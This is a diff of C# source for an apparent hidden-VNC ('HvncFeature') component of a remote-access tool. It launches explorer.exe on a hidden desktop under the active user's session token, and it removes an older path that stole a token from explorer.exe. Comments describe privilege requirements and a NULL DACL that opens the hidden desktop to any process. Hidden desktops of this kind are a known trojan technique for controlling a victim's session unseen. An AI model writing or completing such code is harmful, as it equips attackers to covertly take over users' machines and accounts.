@@ -1871,10 +1871,11 @@ internal static class HvncFeature
     // Caller is responsible for CloseHandle. Returns 0 if not applicable / unavailable.
     private static nint GetLaunchToken()
     {
-        const uint TOKEN_ALL_ACCESS      = 0xF01FF;
-        const uint PROCESS_QUERY_LIMITED = 0x1000;
+        const uint TOKEN_ALL_ACCESS = 0xF01FF;
 
-        // SYSTEM path: WTSQueryUserToken requires SE_TCB_PRIVILEGE (only SYSTEM has it by default)
+        // Only for SYSTEM: get the interactive user token via WTS so explorer
+        // runs with the correct HKCU and session. Admin/User: return 0 and let
+        // the caller use CreateProcessW directly (same token, hidden desktop via lpDesktop).
         uint session = WTSGetActiveConsoleSessionId();
         if (session != 0xFFFFFFFF && WTSQueryUserToken(session, out nint wtsToken))
         {
@@ -1882,32 +1883,6 @@ internal static class HvncFeature
             { CloseHandle(wtsToken); return dup; }
             CloseHandle(wtsToken);
         }
-
-        // Elevated-admin path: borrow explorer.exe token (medium IL, correct HKCU)
-        nint snap = CreateToolhelp32Snapshot(2, 0);
-        if (snap == (nint)(-1)) return 0;
-        try
-        {
-            var e = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
-            if (!Process32FirstW(snap, ref e)) return 0;
-            do
-            {
-                if (!e.szExeFile.Equals("explorer.exe", StringComparison.OrdinalIgnoreCase)) continue;
-                nint hProc = OpenProcess(PROCESS_QUERY_LIMITED, false, e.th32ProcessID);
-                if (hProc == 0) continue;
-                if (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, out nint hTok))
-                {
-                    CloseHandle(hProc);
-                    if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, 0, 2, 1, out nint dup))
-                    { CloseHandle(hTok); return dup; }
-                    CloseHandle(hTok);
-                    return 0;
-                }
-                CloseHandle(hProc);
-            }
-            while (Process32NextW(snap, ref e));
-        }
-        finally { CloseHandle(snap); }
         return 0;
     }
 
@@ -2167,14 +2142,14 @@ internal static class HvncFeature
             PROCESS_INFORMATION pi;
             if (launchToken != 0)
             {
-                // CreateProcessWithTokenW only needs SeImpersonatePrivilege (always present in
-                // elevated admin tokens). CreateProcessAsUserW would require SeAssignPrimaryToken +
-                // SeIncreaseQuota which are only in SYSTEM tokens, not standard admin tokens.
+                // SYSTEM path: launch with interactive user token so explorer gets correct HKCU.
                 if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi))
                     CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi);
             }
             else
             {
+                // Admin/User path: own token is fine — desktop access is via lpDesktop in si,
+                // and the NULL DACL set on _hDesktop lets any IL process access the hidden desktop.
                 CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
             }
             if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
